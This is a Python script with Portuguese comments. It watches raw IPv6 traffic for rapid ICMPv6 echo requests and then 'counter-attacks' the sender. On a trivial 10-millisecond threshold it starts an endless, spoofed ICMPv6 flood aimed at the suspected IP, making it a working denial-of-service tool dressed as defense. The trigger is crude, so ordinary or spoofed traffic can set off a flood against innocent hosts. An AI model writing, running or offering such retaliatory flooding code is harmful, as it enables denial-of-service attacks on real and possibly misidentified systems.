#!/usr/bin/env python3
import socket
import struct
import datetime
import time
import threading
from scapy.all import sendp,IPv6, ICMPv6EchoRequest, send

ETH_P_IPV6 = 0x86DD
ICMPV6_ECHO_REQUEST = 128
THRESHOLD = datetime.timedelta(milliseconds=10)  # intervalo mínimo entre pacotes do mesmo IP
KNOWN_HOSTS = {}
iface = "enp4s0"  # ajuste para sua interface de rede

def parse_ipv6_header(packet):
    ipv6_header = packet[14:14+40]
    unpacked = struct.unpack('!4sHBB16s16s', ipv6_header)
    src_ip = socket.inet_ntop(socket.AF_INET6, unpacked[4])
    dst_ip = socket.inet_ntop(socket.AF_INET6, unpacked[5])
    next_header = unpacked[2]
    return src_ip, dst_ip, next_header

def process_icmpv6_packet(packet, src_ip, dst_ip):
    now = datetime.datetime.utcnow()
    icmpv6_offset = 14 + 40
    icmp_type = packet[icmpv6_offset]

    if icmp_type == ICMPV6_ECHO_REQUEST:
        print(f"[ICMPv6] Echo Request de {src_ip} -> {dst_ip}")

        if src_ip in KNOWN_HOSTS:
            time_diff = now - KNOWN_HOSTS[src_ip]
            if time_diff < THRESHOLD:
                print("⚠️  Ataque detectado!")
                print(f"⏱️  Intervalo: {time_diff}")
                print("🚨 Contra-atacando...")

                # inicia flooding spoofado
                start_ddos_flood(attacker_ip=src_ip)

        KNOWN_HOSTS[src_ip] = now

def flood_icmpv6(attacker_ip):
    pkt = IPv6(src=attacker_ip, dst=attacker_ip) / ICMPv6EchoRequest()
    while True:
        try:
            sendp(pkt, iface=iface, loop=1, inter=0.001)
            time.sleep(0.001)  # ajustável
        except Exception as e:
            print(f"Erro no envio spoofado: {e}")
            break

def start_ddos_flood(attacker_ip):
    t = threading.Thread(target=flood_icmpv6, args=(attacker_ip,), daemon=True)
    t.start()

def main():
    try:
        s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(ETH_P_IPV6))
        s.bind((iface, 0))
    except OSError as msg:
        print(f"Erro ao criar socket: {msg}")
        exit(1)

    print("✅ Monitorando tráfego ICMPv6...")

    while True:
        packet, _ = s.recvfrom(65536)
        eth_header = packet[:14]
        eth = struct.unpack('!6s6sH', eth_header)

        if eth[2] == ETH_P_IPV6:
            try:
                src_ip, dst_ip, next_header = parse_ipv6_header(packet)
                if next_header == 58:  # ICMPv6
                    process_icmpv6_packet(packet, src_ip, dst_ip)
            except Exception as e:
                print(f"Erro ao processar pacote: {e}")

if __name__ == "__main__":
    main()
